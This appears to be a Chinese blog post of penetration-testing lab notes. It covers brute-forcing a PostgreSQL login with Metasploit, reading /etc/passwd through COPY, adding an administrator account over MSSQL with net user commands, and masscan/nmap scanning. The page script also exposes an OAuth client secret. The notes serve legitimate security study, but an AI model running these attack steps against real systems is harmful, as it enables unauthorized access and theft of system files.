+<p>列出数据库<code>\l</code>：<br>``<br>postgres=# \l<br>                                  List of databases<br>   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges<br>—————-+—————+—————+——————-+——————-+———————————-<br> postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |<br> template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +<br>           |          |          |             |             | postgres=CTc/postgres<br> template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +<br>           |          |          |             |             | postgres=CTc/postgres<br>(3 rows)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">列出table&apos;\d&apos;:</span><br></pre></td></tr></table></figure></p>
+<p>ostgres=# \d<br>         List of relations<br> Schema | Name  | Type  |  Owner<br>————+———-+———-+—————<br> public | mrlee | table | postgres<br>(1 row)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>msf5 auxiliary(scanner/postgres/postgres_version) &gt; exploit </p>
+<p>[<em>] 192.168.41.166:5432 Postgres - Version PostgreSQL 9.3.4 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.2-16ubuntu6) 4.8.2, 64-bit (Post-Auth)<br>[</em>] Scanned 1 of 1 hosts (100% complete)<br>[*] Auxiliary module execution completed<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">直接发现弱口令</span><br></pre></td></tr></table></figure></p>
+<p>[-] 192.168.41.166:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)<br>[-] 192.168.41.166:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)<br>[+] 192.168.41.166:5432 - Login Successful: postgres:postgres@template1<br>[-] 192.168.41.166:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后登陆</span><br></pre></td></tr></table></figure></p>
+<h1 id="root-kali-in-3-34-50-C-127"><a href="#root-kali-in-3-34-50-C-127" class="headerlink" title="root @ kali in ~ [3:34:50] C:127"></a>root @ kali in ~ [3:34:50] C:127</h1><p>$ psql -h 192.168.41.166 -U postgres<br>Password for user postgres:<br>psql (11.2 (Debian 11.2-2), server 9.3.4)<br>Type “help” for help.</p>
+<p>postgres=# help<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`select pg_ls_dir(&apos;./&apos;);`列出目录</span><br></pre></td></tr></table></figure></p>
+<p>postgres=# select pg_ls_dir(‘./‘);</p>
+<pre><code>pg_ls_dir    
+</code></pre><hr>
+<p> PG_VERSION<br> pg_notify<br> pg_multixact<br> pg_subtrans<br> pg_serial<br> pg_snapshots<br> pg_stat<br> pg_clog<br> pg_xlog<br> base<br> pg_twophase<br> pg_tblspc<br> global<br> pg_stat_tmp<br> postmaster.opts<br> postmaster.pid<br>(16 rows)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">建表并且从`/etc/passwd`中拷贝数据过来再读取,（这个姿势第一次见）</span><br></pre></td></tr></table></figure>
+<p>postgres=# DROP TABLE if EXISTS MrLee;<br>NOTICE:  table “mrlee” does not exist, skipping<br>DROP TABLE<br>postgres=# CREATE TABLE MrLee(t TEXT);<br>CREATE TABLE<br>postgres=# COPY MrLee FROM ‘/etc/passwd’;<br>COPY 44<br>postgres=# SELECT * FROM MrLee limit 1 offset 0;</p>
+<pre><code>            t                
+</code></pre><hr>
+<p> root:x:0:0:root:/root:/bin/bash<br>(1 row)</p>
+<p>postgres=# SELECT * FROM MrLee;</p>
+<pre><code>                                     t                                         
+</code></pre><hr>
+<p> root:x:0:0:root:/root:/bin/bash<br> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br> bin:x:2:2:bin:/bin:/usr/sbin/nologin<br> sys:x:3:3:sys:/dev:/usr/sbin/nologin</p>
+<p>```</p>
+<h2 id="DC1靶机"><a href="#DC1靶机" class="headerlink" title="DC1靶机"></a>DC1靶机</h2><blockquote>
+<p>姿势： find命令提权，hydra爆破，<a href="http://drupalchina.cn/node/2128" target="_blank" rel="noopener">Drupal重置管理员密码</a></p>
+</blockquote>
+<h2 id="需要积累一些靶机渗透的经验"><a href="#需要积累一些靶机渗透的经验" class="headerlink" title="需要积累一些靶机渗透的经验"></a>需要积累一些靶机渗透的经验</h2><h3 id="msf有好多的扫描工具在auxiliary模块里面，常用的ftp，ssh，smb，https"><a href="#msf有好多的扫描工具在auxiliary模块里面，常用的ftp，ssh，smb，https" class="headerlink" title="msf有好多的扫描工具在auxiliary模块里面，常用的ftp，ssh，smb，https"></a>msf有好多的扫描工具在auxiliary模块里面，常用的ftp，ssh，smb，https</h3><p><a href="https://www.cnblogs.com/-qing-/p/10128915.html" target="_blank" rel="noopener">msf各种弱口令爆破</a></p>
+<h3 id="同时需要熟悉find和grep命令"><a href="#同时需要熟悉find和grep命令" class="headerlink" title="同时需要熟悉find和grep命令"></a>同时需要熟悉find和grep命令</h3><p><a href="https://www.cnblogs.com/-qing-/p/10867549.html" target="_blank" rel="noopener">Linux find和grep命令</a></p>
+<h3 id="熟悉一下各种cms的常见姿势"><a href="#熟悉一下各种cms的常见姿势" class="headerlink" title="熟悉一下各种cms的常见姿势"></a>熟悉一下各种cms的常见姿势</h3><p><a href="http://drupalchina.cn/node/2128" target="_blank" rel="noopener">忘记Drupal的管理员密码的解决办法</a></p>
+<h3 id="metasploit渗透mssql服务"><a href="#metasploit渗透mssql服务" class="headerlink" title="metasploit渗透mssql服务"></a>metasploit渗透mssql服务</h3><p>1433端口对应于mssql服务，第一步一般是弱口令：<br><code>use auxiliary/scanner/mssql/mssql_login</code> 然后设置字典路径和远程主机即可</p>
+<p>还可以使用<code>auxiliary/scanner/mssql/mssql_ping</code>进一步收集信息</p>
+<p>之后尝试登陆mssql服务<br><code>use auxiliary/admin/mssql/mssql_exec</code> 可以设置cmd<code>set CMD cmd.exe /c net user</code></p>
+<p>添加管理员用户，远程登陆：<br><code>cmd.exe /c net user shenlan test /add&amp;net localgroup administrator shenlan /add</code></p>
+<p>开启3389端口一般是提供远程桌面服务，</p>
+<p><a href="渗透之——Metasploit渗透MSSQL">渗透之——Metasploit渗透MSSQL</a></p>
+<h3 id="masscan扫描工具"><a href="#masscan扫描工具" class="headerlink" title="masscan扫描工具"></a>masscan扫描工具</h3><p>扫描指定网络和端口：<br><code>masscan.exe -p80 192.168.81.1/24</code></p>
+<p>扫描指定主机所有开放的端口：</p>
+<blockquote>
+<p>masscan.exe -p0-65535 192.168.81.143</p>
+</blockquote>
+<p><code>--banners</code>可以获取服务器的banner信息 <code>--echo</code>选项将配置信息保存下来，这样可以下一次快速扫描</p>
+<blockquote>
+<p>masscan.exe -p80,443,3306 192.168.81.143 —banners —echo&gt;1.conf 保存配置信息<br>masscan.exe -c 1.conf  读取配置信息</p>
+</blockquote>
+<p><code>--rate</code>提高扫描速度<br><a href="渗透技巧：Windows平台运行Masscan和Nmap">渗透技巧：Windows平台运行Masscan和Nmap</a></p>
+<h3 id="nmap高级使用技巧"><a href="#nmap高级使用技巧" class="headerlink" title="nmap高级使用技巧"></a>nmap高级使用技巧</h3><p>nmap常见的扫描方式：</p>
+<p>半开放扫描: -sS 没有建立三次握手连接，速度很快<br>全连接扫描：-sT  三次握手过程，速度较慢<br>扫描UDP端口： -sU</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/靶机/" rel="tag"># 靶机</a>
+          
+            <a href="/tags/nfs/" rel="tag"># nfs</a>
+          
+            <a href="/tags/nmap/" rel="tag"># nmap</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/06/实验吧web/" rel="next" title="实验吧web">
+                <i class="fa fa-chevron-left"></i> 实验吧web
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/09/DC靶机渗透/" rel="prev" title="DC靶机渗透">
+                DC靶机渗透 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      
+        <div id="gitment-container"></div>
+      
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="百浪多息">
+            
+              <p class="site-author-name" itemprop="name">百浪多息</p>
+              <p class="site-description motion-element" itemprop="description">还有很长的路要走</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xinyongpeng" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:xinyongp@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.jianshu.com/u/7b4cb9cdc0c8" target="_blank" title="简书">
+                      
+                        <i class="fa fa-fw fa-globe"></i>简书</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/he-yan-52-34/activities" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-globe"></i>知乎</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.szfszf.top/" title="zsfnb!" target="_blank">zsfnb!</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://stackexit.cn/?tdsourcetag=s_pctim_aiomsg" title="xggnb!" target="_blank">xggnb!</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+         
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#21号端口"><span class="nav-number">1.</span> <span class="nav-text">21号端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#22端口"><span class="nav-number">2.</span> <span class="nav-text">22端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#25端口smtp服务"><span class="nav-number">3.</span> <span class="nav-text">25端口smtp服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5432端口postgresql服务"><span class="nav-number">4.</span> <span class="nav-text">5432端口postgresql服务</span></a></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#root-kali-in-3-34-50-C-127"><span class="nav-number"></span> <span class="nav-text">root @ kali in ~ [3:34:50] C:127</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DC1靶机"><span class="nav-number"></span> <span class="nav-text">DC1靶机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#需要积累一些靶机渗透的经验"><span class="nav-number"></span> <span class="nav-text">需要积累一些靶机渗透的经验</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#msf有好多的扫描工具在auxiliary模块里面，常用的ftp，ssh，smb，https"><span class="nav-number">1.</span> <span class="nav-text">msf有好多的扫描工具在auxiliary模块里面，常用的ftp，ssh，smb，https</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#同时需要熟悉find和grep命令"><span class="nav-number">2.</span> <span class="nav-text">同时需要熟悉find和grep命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#熟悉一下各种cms的常见姿势"><span class="nav-number">3.</span> <span class="nav-text">熟悉一下各种cms的常见姿势</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#metasploit渗透mssql服务"><span class="nav-number">4.</span> <span class="nav-text">metasploit渗透mssql服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#masscan扫描工具"><span class="nav-number">5.</span> <span class="nav-text">masscan扫描工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap高级使用技巧"><span class="nav-number">6.</span> <span class="nav-text">nmap高级使用技巧</span></a></li></ol></li></ol></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">百浪多息</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css">
+        <script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitmint({
+            id: window.location.pathname, 
+            owner: 'xinyongpeng',
+            repo: 'gitcomment',
+            
+            lang: "" || navigator.language || navigator.systemLanguage || navigator.userLanguage,
+            
+            oauth: {
+            
+            
+                client_secret: '6504c858cdee4a1f61f0e8c95b1eab199539dc78',
+            
+                client_id: '077d264849f8fc28a574'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      renderGitment();
+      
+      </script>
+    
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.staticfile.org/MathJax/MathJax-2.6-latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
